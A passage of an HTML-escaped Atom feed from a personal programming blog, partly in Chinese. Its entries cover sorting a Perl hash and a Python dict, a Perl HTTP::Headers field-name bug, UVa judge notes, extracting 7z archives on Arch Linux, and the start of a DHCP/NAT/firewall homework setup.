&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="nv"&gt;$key&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;sort&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$b&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="sr"&gt;&amp;lt;=&amp;gt;&lt;/span&gt; &lt;span class="nv"&gt;$hash&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nv"&gt;$a&lt;/span&gt;&lt;span class="p"&gt;};}&lt;/span&gt; &lt;span class="nb"&gt;keys&lt;/span&gt; &lt;span class="nv"&gt;%h&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="n"&gt;say&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;$key: $h{$key}&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="Perl"></category><category term="sort"></category></entry><entry><title>[Python] Sort dictionary by key or value</title><link href="https://blog.m157q.tw/posts/2013/05/10/python-sort-dictionary-by-key-or-value/" rel="alternate"></link><published>2013-05-10T16:33:00+08:00</published><updated>2013-05-10T16:33:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-10:posts/2013/05/10/python-sort-dictionary-by-key-or-value/</id><summary type="html">&lt;h1&gt;in python3.3&lt;/h1&gt;
&lt;p&gt;&lt;!--more--&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(k, v) == (key, value)  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h4&gt;sort by key&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;t[0] means key  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h4&gt;sort by value&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;sorted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;t&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]):&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;t[1] means value  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;--  &lt;/p&gt;</summary><category term="Python"></category><category term="Sort"></category><category term="Python3"></category></entry><entry><title>Illegal field name 'X-Meta-Twitter:card'</title><link href="https://blog.m157q.tw/posts/2013/05/08/illegal-field-name-x-meta-twittercard/" rel="alternate"></link><published>2015-10-28T15:07:00+08:00</published><updated>2015-10-28T15:07:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-05-08:posts/2013/05/08/illegal-field-name-x-meta-twittercard/</id><summary type="html">&lt;p&gt;最近因為 NA 作業2 開始寫 Perl&lt;br /&gt;
其中一個是寫 IRC bot&lt;br /&gt;
作業 Demo 完後自己繼續開發新功能&lt;br /&gt;
要做檢查到 URL 就回應該 URL Html source 的 title label 和 縮網址&lt;br /&gt;
用了 CPAN 的 &lt;code&gt;WWW::Mechanize&lt;/code&gt;&lt;br /&gt;
結果 xatier 丟了 &lt;a href="https://gist.github.com/xatier/5538258"&gt;gist:5538258 · GitHub&lt;/a&gt; 出來後&lt;br /&gt;
IRC bot 就 die 了&lt;br /&gt;
噴出了這行錯誤  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Illegal field name 'X-Meta-Twitter:card' at .../HTML/HeadParser.pm line 207.&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Google 了一下 Error Message 發現不少人都有遇到  &lt;/p&gt;
&lt;p&gt;根據這篇底下的 comment 找到了答案 (其實自己先 Trace code 之後也找到了同樣的地方  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://github.com/libwww-perl/http-message/issues/3#issuecomment-10118644"&gt;lwp-download fails with HTTP::Message 6.06 · Issue #3 · libwww-perl/http-message · GitHub&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;問題就出在 &lt;code&gt;perl5/lib/per5/HTTP/Headers.pm&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;HTML::HeadParser&lt;/code&gt; 有用到 &lt;code&gt;HTTP::Headers&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;裏面有個叫 &lt;code&gt;_header&lt;/code&gt; 的 subroutine (不過在上面那篇的 comment 裏面好像是 header  &lt;/p&gt;
&lt;p&gt;裏面有一行  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nn"&gt;Carp::&lt;/span&gt;&lt;span class="n"&gt;croak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Illegal field name &amp;#39;$field&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;rindex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;length&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;問題就出在  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;rindex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;只要 &lt;code&gt;:&lt;/code&gt; 後面有東西的話就會回傳 &lt;code&gt;True&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;Twiiter:card&lt;/code&gt; 的 &lt;code&gt;:&lt;/code&gt; 後面有 &lt;code&gt;card&lt;/code&gt; 所以被判定成 &lt;code&gt;Illegal field name&lt;/code&gt; 了  &lt;/p&gt;
&lt;p&gt;要修正的話就照那個 comment 說的  &lt;/p&gt;
&lt;p&gt;把該行改成  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nn"&gt;Carp::&lt;/span&gt;&lt;span class="n"&gt;croak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Illegal field name &amp;#39;$field&amp;#39;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nv"&gt;$field&lt;/span&gt; &lt;span class="o"&gt;!~&lt;/span&gt; &lt;span class="sr"&gt;/^X-Meta/&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nb"&gt;rindex&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;:&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="nb"&gt;length&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這樣就不會判斷 &lt;code&gt;X-Meta&lt;/code&gt; 開頭的了  &lt;/p&gt;
&lt;p&gt;只是這問題己經 6~7 個月了 開發者最近 commit 的時間也還是 2 個月前  &lt;/p&gt;
&lt;p&gt;不懂為啥這問題遲遲不解決@@  &lt;/p&gt;</summary><category term="Perl"></category><category term="CPAN"></category><category term="WWW::Mechanize"></category><category term="X-Meta-Twitter:card"></category></entry><entry><title>[Cpp] [Online Judge] UVa 737 Gleaming the Cubes</title><link href="https://blog.m157q.tw/posts/2013/04/29/cpp-online-judge-uva-737-gleaming-the-cubes/" rel="alternate"></link><published>2013-04-29T20:16:00+08:00</published><updated>2013-04-29T20:16:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-29:posts/2013/04/29/cpp-online-judge-uva-737-gleaming-the-cubes/</id><summary type="html">&lt;p&gt;2013/04/29 基礎程式檢定考題之一&lt;br /&gt;
(共7題 我寫了三題 只對一題Orz 後來花時間把沒寫完的兩題寫完 這是其中一題)  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://uva.onlinejudge.org/external/7/737.html"&gt;http://uva.onlinejudge.org/external/7/737.html&lt;/a&gt;  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;這題是被 Compiler 雷到... 答案算是已經寫出來了...Orz  &lt;/p&gt;
&lt;p&gt;上機考的電腦是用 gcc 4.2.x 在本地端 compile 沒有噴 error  &lt;/p&gt;
&lt;p&gt;考完後在自己的筆電上的 gcc 4.8.0 測試也沒噴 error  &lt;/p&gt;
&lt;p&gt;結果上傳上去就噴 error 說找不到適合的 overloaded function 可用  &lt;/p&gt;
&lt;p&gt;究竟程式檢定 server 用的 compiler 是哪一個啊@_@?  &lt;/p&gt;
&lt;p&gt;但結果追根究底是因為我沒搞清楚 &lt;code&gt;abs()&lt;/code&gt; 這個 function...  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;cstdlib&lt;/code&gt; 和 &lt;code&gt;cmath&lt;/code&gt; 都有 &lt;code&gt;abs()&lt;/code&gt; 這個 function  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;cstdlib&lt;/code&gt; 的 &lt;code&gt;abs()&lt;/code&gt; 是給整數型態用的 &lt;code&gt;cmath&lt;/code&gt; 的 &lt;code&gt;abs()&lt;/code&gt; 是給浮點數型態用的  &lt;/p&gt;
&lt;p&gt;而我在這裡要取的是整數型態的絕對值 所以應該要 &lt;code&gt;#include &amp;lt;cstdlib&amp;gt;&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;結果我記錯 寫了 &lt;code&gt;#include &amp;lt;cmath&amp;gt;&lt;/code&gt; (然後就是悲劇Orz  &lt;/p&gt;
&lt;p&gt;請參閱&lt;br /&gt;
&lt;a href="http://www.cplusplus.com/reference/cstdlib/abs/"&gt;http://www.cplusplus.com/reference/cstdlib/abs/&lt;/a&gt;&lt;br /&gt;
裏面有提到  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In C++, this function is also overloaded in header &lt;a href="http://www.cplusplus.com/cmath"&gt;cmath&lt;/a&gt; for floating-point types (see &lt;a href="http://www.cplusplus.com/cmath:abs"&gt;cmath abs&lt;/a&gt;),&lt;br /&gt;
in header &lt;a href="http://www.cplusplus.com/complex"&gt;complex&lt;/a&gt; for complex numbers (see &lt;a href="http://www.cplusplus.com/complex:abs"&gt;complex abs&lt;/a&gt;),&lt;br /&gt;
and in header &lt;a href="http://www.cplusplus.com/valarray"&gt;valarray&lt;/a&gt; for valarrays (see &lt;a href="http://www.cplusplus.com/valarray:abs"&gt;valarray abs&lt;/a&gt;).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以其實很多 library 裏面都有 &lt;code&gt;abs()&lt;/code&gt; 這個 function&lt;br /&gt;
這裡就不細講了 有興趣的人請自行參閱  &lt;/p&gt;
&lt;p&gt;而 &lt;code&gt;cmath&lt;/code&gt; 的 &lt;code&gt;abs()&lt;/code&gt; 也有提到&lt;br /&gt;
&lt;a href="http://www.cplusplus.com/reference/cmath/abs/"&gt;http://www.cplusplus.com/reference/cmath/abs/&lt;/a&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;These convenience abs overloads are exclusive of C++.&lt;br /&gt;
In C, &lt;a href="http://www.cplusplus.com/abs"&gt;abs&lt;/a&gt; is only declared in &lt;a href="http://www.cplusplus.com/cstdlib"&gt;cstdlib&lt;/a&gt; (and only operates on integral values).  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以在 C 裏面&lt;br /&gt;
只有 &lt;code&gt;&amp;lt;stdlib.h&amp;gt;&lt;/code&gt; 裏面有 &lt;code&gt;abs()&lt;/code&gt; 這個 function 而且還只能給整數型態用&lt;br /&gt;
因為沒有 function overloading&lt;br /&gt;
(看到這個就覺得我應該用 C 寫的Orz  老實說其實自己寫一個也很快Orz  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;abs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="p"&gt;{&lt;/span&gt;  
&lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nl"&gt;a&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這樣就行了...&lt;br /&gt;
反正後來總算是寫出來了 也找到了錯誤 應該值得高興(吧？&lt;br /&gt;
以下是我的 code  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/M157q/c92d437af7f7d497de67"&gt;https://gist.github.com/M157q/c92d437af7f7d497de67&lt;/a&gt;  &lt;/p&gt;</summary><category term="Cpp"></category><category term="Online Judge"></category><category term="abs"></category></entry><entry><title>[Cpp] [Online Judge] UVa 10579 Fibonacci Numbers</title><link href="https://blog.m157q.tw/posts/2013/04/29/cpp-online-judge-uva-10579-fibonacci-numbers/" rel="alternate"></link><published>2013-04-29T19:57:00+08:00</published><updated>2013-04-29T19:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-29:posts/2013/04/29/cpp-online-judge-uva-10579-fibonacci-numbers/</id><summary type="html">&lt;p&gt;2013/04/29 基礎程式檢定考題之一&lt;br /&gt;
(共7題 我寫了三題 只對一題Orz 後來花時間把沒寫完的兩題寫完 這是其中一題)  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://uva.onlinejudge.org/external/105/10579.html"&gt;http://uva.onlinejudge.org/external/105/10579.html&lt;/a&gt;  &lt;/p&gt;
&lt;!--more--&gt;

&lt;p&gt;這題必須要用大數加法才能做出來  &lt;/p&gt;
&lt;p&gt;題目說答案不會超過 1000 位數  &lt;/p&gt;
&lt;p&gt;我在考試的時候還很開心的用 unsigned long long 去算答案= ="  &lt;/p&gt;
&lt;p&gt;unsigned long long 最大值是 2^64 -1 == 1.8446744073709551615 × 10^19  &lt;/p&gt;
&lt;p&gt;也就是只能完全計算到 18 位數和一點點 19 位數 超過以後就會 overflow...  &lt;/p&gt;
&lt;p&gt;我還在那邊試很久= =" 想說怎麼測資都沒對 大概是上機考的時候太緊張了吧= =""  &lt;/p&gt;
&lt;p&gt;對大數不太熟悉 剛好就用這題來練習  &lt;/p&gt;
&lt;p&gt;Big number 就是把原本的 int 分開成 int array 去儲存  &lt;/p&gt;
&lt;p&gt;每個 element 都代表一個位數 作法就像小學時候學的直式加法一樣  &lt;/p&gt;
&lt;p&gt;所以可以一直加下去 只要用來儲存答案位數的 int array 給的夠大就行  &lt;/p&gt;
&lt;p&gt;以下是我的 code  &lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/M157q/53d3dc8586ddee57e240"&gt;https://gist.github.com/M157q/53d3dc8586ddee57e240&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;因為有點懶的打英文 所以用了中文註解...  &lt;/p&gt;</summary><category term="Cpp"></category><category term="Online Judge"></category><category term="Big Number"></category></entry><entry><title>Unzip 7zip file by p7zip on Arch Linux</title><link href="https://blog.m157q.tw/posts/2013/04/11/unzip-7zip-file-by-p7zip-on-arch-linux/" rel="alternate"></link><published>2015-10-26T14:19:00+08:00</published><updated>2015-10-26T14:19:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-11:posts/2013/04/11/unzip-7zip-file-by-p7zip-on-arch-linux/</id><summary type="html">&lt;p&gt;組語作業給的 template 是用 &lt;code&gt;7zip&lt;/code&gt; 打包成副檔名為 &lt;code&gt;.7z&lt;/code&gt; 的檔案&lt;br /&gt;
為了寫 report 想要把 &lt;code&gt;.7z&lt;/code&gt; 的 file 解壓縮  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;因為習慣在 CLI 環境下工作&lt;br /&gt;
於是就 google 搜尋了一下有沒有相關的 command&lt;br /&gt;
然後找到了 &lt;a href="http://blog.xuite.net/michaelr/linux/17595860"&gt;Linux下解開7z丶7zip檔 @ 麥克星球 Linux Fedora 心得筆記 :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;/p&gt;
&lt;h2&gt;Keyword: p7zip&lt;/h2&gt;
&lt;p&gt;在 Arch Linux 下&lt;br /&gt;
&lt;code&gt;$ pacman -Ss p7zip&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;出現以下的訊息  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;extra/p7zip 9.20.1-6  
Command-line version of the 7zip compressed file archiver  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接著就&lt;br /&gt;
&lt;code&gt;$ sudo pacman -S p7zip&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;安裝完畢之後會多一個 7z 的指令可以使用  &lt;/p&gt;
&lt;p&gt;想看 man page 的話就&lt;br /&gt;
&lt;code&gt;$ man 7z&lt;/code&gt;&lt;br /&gt;
我是覺得沒有寫的很清楚啦  &lt;/p&gt;
&lt;p&gt;所以我又去找了一些網站  &lt;/p&gt;
&lt;p&gt;底下這個網站有些簡單易懂的範例&lt;br /&gt;
&lt;a href="https://www.ibm.com/developerworks/community/blogs/6e6f6d1b-95c3-46df-8a26-b7efd8ee4b57/entry/how_to_use_7zip_on_linux_command_line144?lang=en"&gt;How to use 7zip on Linux command Line (Real world open source)&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;不過還是沒找到我想要的  &lt;/p&gt;
&lt;p&gt;如果我直接下&lt;br /&gt;
&lt;code&gt;$ 7z e xxx.7z&lt;/code&gt;&lt;br /&gt;
就會有悲劇發生  &lt;/p&gt;
&lt;p&gt;xxx.7z 裏面的東西會全部跟我的當前資料夾所有東西混在一起!!&lt;br /&gt;
所以要怎樣才能讓 7z 在解壓縮一個檔案的時候順便新建一個資料夾把檔案都塞進去呢?&lt;br /&gt;
我 google 到了有人問了同樣的問題(果然不是只有我笨)&lt;br /&gt;
&lt;a href="http://superuser.com/questions/95902/7-zip-and-unzipping-from-command-line"&gt;7 zip - 7-Zip and unzipping from command line - Super User&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;結果原來只要&lt;br /&gt;
&lt;code&gt;$ 7z x xxx.7z&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;沒錯 只要把 e 改成 x 就好了  &lt;/p&gt;
&lt;p&gt;後來看到其實在 man page 有寫了這些東西  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;FUNCTION LETTERS  
     a Add  
     d Delete  
     e Extract  
     l List  
     t Test  
     u Update  
     x eXtract with full paths  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;沒錯 就是最後那行! x!  &lt;/p&gt;
&lt;p&gt;總之就是這樣 以後解壓縮 .7z 的 file 也跟 .tar .zip 那些檔案一樣&lt;br /&gt;
用 CLI 就可以解決啦  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.xuite.net/michaelr/linux/17595860"&gt;Linux下解開7z丶7zip檔 @ 麥克星球 Linux Fedora 心得筆記 :: 隨意窩 Xuite日誌&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ibm.com/developerworks/community/blogs/6e6f6d1b-95c3-46df-8a26-b7efd8ee4b57/entry/how_to_use_7zip_on_linux_command_line144?lang=en"&gt;How to use 7zip on Linux command Line (Real world open source)&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://superuser.com/questions/95902/7-zip-and-unzipping-from-command-line"&gt;7 zip - 7-Zip and unzipping from command line - Super User&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Linux"></category><category term="Arch Linux"></category><category term="Linux"></category><category term="7zip"></category><category term="CLI"></category></entry><entry><title>Network Administration Hw1: Setup DHCP, NAT, Firewall</title><link href="https://blog.m157q.tw/posts/2013/04/09/network-administration-hw1-setup-dhcp-nat-firewall/" rel="alternate"></link><published>2015-10-27T21:31:00+08:00</published><updated>2015-10-27T21:31:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2013-04-09:posts/2013/04/09/network-administration-hw1-setup-dhcp-nat-firewall/</id><summary type="html">&lt;h2&gt;Setup DHCP, NAT, Firewall&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;I done this homework in Arch Linux  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr /&gt;
&lt;h2&gt;SPEC&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Server - dhcp server, NAT, Firewall, ftp-proxy, transparent http proxy (TP)  
(home-q) dhcp server =&amp;gt; dhcpd;  
         NAT, Firewall, ftp-proxy =&amp;gt; iptables;  
         transparent http proxy =&amp;gt; squid;  
         外網網卡 enp0s18 140.113.27.37  
         內網網卡 enp0s19 172.16.1.254  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HostA -  dhcp client with private ip (172.16.1.101~172.16.1.200)  
(www-q)  http client browse through Server&amp;#39;s TP  
         dhcp client =&amp;gt; dhcpcd;  
         內網網卡 enp0s18  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;HostB -  dhcp client with static private ip (172.16.1.30)  
(mail-q) provide ssh service (bind on Server&amp;#39;s 222 port)  
         provide ftp service (bind on Server&amp;#39;s 21 port)  
         ftp service =&amp;gt; vsftpd;  
         內網網卡 enp0s18; MAC 5a:49:97:32:c3:13 (拿來給 dhcpd 發 static private ip)  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;DHCP server (on home-q)&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/Dhcpd"&gt;https://wiki.archlinux.org/index.php/Dhcpd&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://linux.vbird.org/linux_server/0340dhcp.php"&gt;http://linux.vbird.org/linux_server/0340dhcp.php&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基本上就照著 Arch wiki 作&lt;br /&gt;
&lt;code&gt;# ip addr add 172.16.1.254/24 dev enp0s19&lt;/code&gt;&lt;br /&gt;
然後在 &lt;code&gt;/etc/dhcpd.conf&lt;/code&gt; 中寫下規則  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;option&lt;/span&gt; &lt;span class="nt"&gt;domain-name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;nctucs.net&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span class="err"&gt; &lt;/span&gt; &lt;span 